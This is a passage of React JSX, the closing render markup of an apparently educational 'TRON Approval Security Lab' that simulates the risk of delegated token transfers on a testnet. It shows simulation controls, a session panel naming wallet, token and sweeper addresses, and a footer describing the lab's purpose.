                  {running ? "Running…" : cursor >= steps.length ? "Re-run simulation" : "Run simulation"}
                </button>
                <button className="btn ghost" onClick={singleStep} disabled={running || cursor >= steps.length}>Single step</button>
                <button className="btn ghost" onClick={reset}>Reset</button>
              </div>
            </div>

            <div className="card">
              <h2>Session</h2>
              <div className="kv"><span className="k">wallet</span><span className="v">{short(wallet)}</span></div>
              <div className="kv"><span className="k">token</span><span className="v">{short(TOKEN_ADDRESS)}</span></div>
              <div className="kv"><span className="k">sweeper</span><span className="v bad">{short(SWEEPER_ADDRESS)}</span></div>
              <div className="kv"><span className="k">stage</span><span className="v">{Math.min(cursor + 1, 5)} / 5</span></div>
            </div>
          </aside>
        </div>

        <p className="foot">
          TRON Approval Security Lab · single-file educational artifact · sandbox + Shasta testnet only.<br />
          Demonstrates delegated-transfer risk to motivate simulation, revocation and intent-bound signatures.
        </p>
      </div>

      {awaiting && <button className="continue" onClick={continueNow}>Continue → next stage</button>}
    </div>
  );
}